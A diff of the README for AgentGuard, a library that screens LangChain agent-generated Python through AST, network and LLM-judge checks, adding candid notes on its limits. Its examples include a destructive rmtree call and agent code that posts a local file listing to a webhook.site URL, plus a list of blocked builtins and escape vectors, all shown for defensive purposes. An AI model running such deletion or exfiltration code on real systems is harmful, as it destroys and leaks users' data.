@@ -1,6 +1,9 @@
 # 🛡️ AgentGuard
 
-> **A security middleware for LangChain agents** — intercept, validate and safely execute LLM-generated code.
+> **Experimental security guardrails for LangChain agent code execution.**
+
+> [!WARNING]
+> **Alpha / Proof of Concept** — This project is an experimental research tool, not a production-grade security boundary. The current in-process execution model has [known limitations](#-known-limitations). Use it as an additional layer of defense, not as your only one.
 
 [![CI](https://github.com/Thomas-LEON/agentguard/actions/workflows/ci.yml/badge.svg)](https://github.com/Thomas-LEON/agentguard/actions)
 [![PyPI](https://img.shields.io/pypi/v/securellm-agentguard.svg)](https://pypi.org/project/securellm-agentguard/)
@@ -12,9 +15,7 @@
 
 ## 🤔 The Problem
 
-Modern LangChain agents are powerful because they can **generate and execute Python code** autonomously. But this power is a double-edged sword.
-
-A single malicious prompt or a hallucination can lead an agent to generate code like this:
+Modern LangChain agents can **generate and execute Python code** autonomously. A single malicious prompt or hallucination can lead an agent to generate destructive code:
 
 ```python
 # An agent asked to "clean up temp files" might generate:
@@ -23,15 +24,13 @@ import shutil
 shutil.rmtree("/var/data/users")  # 💀 Oops.
 ```
 
-There is no native guardrail in LangChain to prevent this.
-
-**AgentGuard is that guardrail.**
+There is no native guardrail in LangChain to prevent this. **AgentGuard adds pre-execution filters to catch obvious dangerous patterns before they run.**
 
 ---
 
-## ✅ The Solution
+## ✅ What It Does
 
-AgentGuard wraps your agent's code execution tool in a **3-layer security pipeline**. Before any LLM-generated code runs, it must pass through all three layers:
+AgentGuard wraps your agent's code execution tool in a **3-layer validation pipeline**. Before any LLM-generated code runs, it must pass through all three layers:
 
 ```mermaid
 flowchart TD
@@ -40,7 +39,7 @@ flowchart TD
     B -->|"❌ Blocked"| E["🛡️ SecurityBlockedError\n→ Agent self-corrects"]
     C -->|"✅ Pass"| D{"🧠 Layer 3: Semantic Judge"}
     C -->|"❌ Blocked"| E
-    D -->|"✅ SAFE"| F["⚡ Sandboxed exec()\n→ Result back to Agent"]
+    D -->|"✅ SAFE"| F["⚡ Restricted exec()\n→ Result back to Agent"]
     D -->|"❌ UNSAFE"| E
 
     style A fill:#4a9eff,color:#fff
@@ -51,13 +50,11 @@ flowchart TD
     style F fill:#2ed573,color:#fff
 ```
 
-If any layer blocks the code, the agent receives a **descriptive error** and **self-corrects** — no crash, no data loss.
+If any layer blocks the code, the agent receives a **descriptive error message** and can **self-correct** — instead of crashing or failing silently.
 
 ---
 
-## 🛡️ How it works in Action
-
-When an agent attempts to execute unauthorized system operations, AgentGuard intercepts the execution and provides a self-healing feedback loop back to the LLM:
+## 🛡️ How It Works in Action
 
 ```text
 > Entering new AgentExecutor chain...
@@ -70,9 +67,13 @@ import requests
 files = os.listdir('.')
 requests.post('https://webhook.site/test', json={"files": files})
 
-Observation: [AgentGuard | AST Validator] 🔴 BLOCKED — Forbidden import detected: 'os'. Rewrite the code without the forbidden operation.
-Thought: I am not allowed to use the 'os' module to read files. I cannot fulfill this request as it requires system access.
-Final Answer: 🛑 I am sorry, but I am restricted from accessing the local file system or sending data to external webhooks due to security policies.
+Observation: [AgentGuard | AST Validator] 🔴 BLOCKED — Forbidden import
+detected: 'os'. Rewrite the code without the forbidden operation.
+
+Thought: I am not allowed to use the 'os' module. I cannot fulfill this
+request as it requires system access.
+Final Answer: 🛑 I am restricted from accessing the local file system or
+sending data to external webhooks due to security policies.
 ```
 
 ---
@@ -84,26 +85,31 @@ pip install securellm-agentguard
 ```
 
 ```python
-import os
 from agentguard import SafePythonREPLTool, SecurityPolicy
-from langchain_google_genai import ChatGoogleGenerativeAI
-
-os.environ["GEMINI_API_KEY"] = "your-api-key"
 
 # Define your security rules
 policy = SecurityPolicy(
     allowed_modules=["pandas", "json", "math"],
     allowed_domains=["api.github.com"],
-    use_semantic_judge=True,
+    use_semantic_judge=False,  # Set True + pass judge_llm for Layer 3
 )
 
-# Layer 3 requires a Gemini LLM (optional — Layers 1 & 2 work without it)
-judge_llm = ChatGoogleGenerativeAI(model="gemini-2.0-flash")
-safe_repl = SafePythonREPLTool(policy=policy, judge_llm=judge_llm)
+safe_repl = SafePythonREPLTool(policy=policy)
 
 # Use it in your LangChain agent instead of PythonREPLTool
 # agent = create_react_agent(llm=your_llm, tools=[safe_repl])
 ```
+
+**With Layer 3 (optional — any LangChain-compatible LLM):**
+
+```python
+from langchain_google_genai import ChatGoogleGenerativeAI  # or ChatOpenAI, ChatAnthropic, etc.
+
+judge_llm = ChatGoogleGenerativeAI(model="gemini-2.0-flash")
+safe_repl = SafePythonREPLTool(policy=policy, judge_llm=judge_llm)
+```
+
+> **Note:** Layer 3 works with any `BaseChatModel` — Gemini, GPT-4, Claude, Mistral, Ollama, etc.
 
 ---
 
@@ -113,7 +119,7 @@ safe_repl = SafePythonREPLTool(policy=policy, judge_llm=judge_llm)
 |---|---|---|---|
 | `allowed_modules` | `list[str]` | `["math", "json", ...]` | Whitelisted Python modules |
 | `allowed_domains` | `list[str]` | `[]` (block all) | Whitelisted network domains |
-| `use_semantic_judge` | `bool` | `True` | Enable Gemini LLM analysis |
+| `use_semantic_judge` | `bool` | `True` | Enable LLM semantic analysis |
 | `execution_timeout` | `int` | `10` | Max execution seconds |
 
 ---
@@ -128,7 +134,7 @@ Uses Python's native `ast` module to parse the code **without executing it**.
 - Any `import` not explicitly whitelisted in `allowed_modules`
 - `from X import Y` style imports of non-whitelisted modules
 - Dangerous built-in calls: `exec`, `eval`, `compile`, `open`, `__import__`
-- Sandbox escape vectors: `getattr`, `setattr`, `delattr`, `globals`, `locals`
+- Common escape vectors: `getattr`, `setattr`, `delattr`, `globals`, `locals`
 
 **Speed:** ~0.1ms — no I/O, no network, pure AST traversal.
 
@@ -143,23 +149,38 @@ Uses regex patterns to detect outbound network calls and validates target domain
 - Raw `socket.connect()` calls
 - Bare URL literals (`https://...`)
 
-An empty `allowed_domains` list blocks **all** network access.
+> **Note:** This is a heuristic regex-based filter, not an OS-level network control. Sophisticated obfuscation may evade it — Layer 3 exists to catch what Layers 1 & 2 miss.
 
-### Layer 3 — Semantic Judge (Gemini)
+### Layer 3 — Semantic Judge (LLM)
 
-For subtle attacks that evade static analysis (e.g. a loop that deletes files one-by-one), the code is sent to `gemini-2.0-flash` with a strict binary prompt.
+For subtle attacks that evade static analysis (e.g. a loop that deletes files one-by-one), the code is sent to a fast LLM (e.g. `gemini-2.0-flash`) with a strict binary prompt.
 
 **Verdict:** Only code classified as `SAFE` passes. Anything else (including ambiguous responses) is blocked — **fail-closed by design**.
 
-**Catches:** Data exfiltration, privilege escalation, destructive file operations, obfuscated malicious intent.
+> **Note:** The LLM judge is a probabilistic defense — it can be wrong. It also sends code to a third-party API. Use it as an additional signal, not as a guarantee.
 
-### Sandboxed Execution
+### Restricted Execution
 
-Code that passes all 3 layers runs in a restricted environment:
+Code that passes all 3 layers runs in a restricted in-process environment:
 - **Safe builtins only** — `print`, `len`, `range`, etc. (no `exec`, `eval`, `open`)
+- **Controlled `__import__`** — only policy-whitelisted modules can be imported
 - **stdout capture** — `print()` output is returned to the agent
 - **Timeout enforcement** — configurable via `execution_timeout`
-- **Thread isolation** — execution runs in a daemon thread
+
+---
+
+## ⚠️ Known Limitations
+
+This is an **alpha-stage** research project. The following limitations are known:
+
+| Limitation | Detail |
+|---|---|
+| **In-process execution** | Code runs via `exec()` in a restricted builtins dict, not in a separate process or container. A determined attacker could escape via object introspection chains on authorized modules. |
+| **Thread-based timeout** | Python threads cannot be forcibly killed. After a timeout, the code may continue running in the background. |
+| **Regex-based network filter** | The network filter is heuristic. Obfuscated URLs or dynamically-constructed network calls will not be caught by Layer 2. |
+| **LLM judge is probabilistic** | The semantic judge can be wrong, manipulated, or bypassed. It also sends code to a third-party API. |
+
+**Planned for v0.2:** Subprocess/container-based isolation with OS-level controls, adversarial test suite, and killable execution.
 
 ---
 
@@ -175,7 +196,7 @@ agentguard/
 │   │   ├── ast_validator.py     # Layer 1: Static AST analysis
 │   │   └── network_filter.py    # Layer 2: Network domain filter
 │   ├── judges/
-│   │   └── gemini_judge.py      # Layer 3: Gemini semantic judge
+│   │   └── gemini_judge.py      # Layer 3: LLM semantic judge
 │   └── tools/
 │       └── langchain_tool.py    # SafePythonREPLTool (LangChain BaseTool)
 ├── tests/                       # Pytest suite (mocked LLM for Layer 3)
@@ -191,16 +212,16 @@ agentguard/
 
 ## 🗺️ Roadmap
 
-- [x] 3-layer security pipeline (AST + Network + Semantic Judge)
+- [x] 3-layer validation pipeline (AST + Network + Semantic Judge)
 - [x] LangChain `BaseTool` integration
-- [x] Sandboxed execution with safe builtins
+- [x] Restricted execution with safe builtins
 - [x] Timeout enforcement
 - [x] GitHub Actions CI
+- [x] PyPI Publication — `pip install securellm-agentguard`
+- [ ] **Process/Container Isolation** — replace in-process exec with a killable subprocess or ephemeral container
+- [ ] **Adversarial Test Suite** — sandbox escape tests, obfuscation tests, resource abuse tests
 - [ ] **Logging & Audit Trail** — structured logs of every blocked/allowed execution
-- [ ] **Dashboard UI** — web dashboard to visualize security events in real-time
-- [ ] **Rate Limiting** — limit the number of code executions per minute
 - [ ] **Plugin System** — custom validator layers via a simple interface
-- [x] **PyPI Publication** — `pip install securellm-agentguard`
 - [ ] **LangSmith Integration** — trace security events in LangSmith
 
 ---
